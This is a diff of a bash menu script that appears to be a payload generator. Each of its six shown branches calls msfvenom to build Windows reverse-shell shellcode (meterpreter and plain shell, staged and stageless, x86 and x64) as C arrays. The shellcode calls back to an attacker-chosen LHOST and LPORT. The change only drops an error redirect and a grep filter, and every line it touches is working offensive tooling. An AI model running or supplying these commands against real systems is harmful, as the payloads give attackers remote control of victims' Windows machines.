@@ -100,7 +100,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-            msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
             exit
     elif [ $opc -eq 2 ]; then
             echo ""
@@ -114,7 +114,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-            msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
             exit
     elif [ $opc -eq 3 ]; then
             echo ""
@@ -128,7 +128,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-            msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
             exit
     elif [ $opc -eq 4 ]; then
             echo ""
@@ -142,7 +142,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-            msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            msfvenom -a x64 --platform windows -p windows/x64/shell/reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
             exit
     elif [ $opc -eq 5 ]; then
             echo ""
@@ -156,7 +156,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-            msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
             exit
     elif [ $opc -eq 6 ]; then
             echo ""
@@ -170,7 +170,7 @@ read -p " $(echo -e $v$shell $nc)" opc
 	    echo ""
 	    echo -e "$b$msf$nc"
 	    echo ""
-            msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c 2>/dev/null | grep -v "unsigned"
+            msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=$lhost LPORT=$lport EXITFUNC=thread -b "\x00\x0a\x0d" -f c
             exit
     elif [ $opc -eq 7 ]; then
 	    echo ""
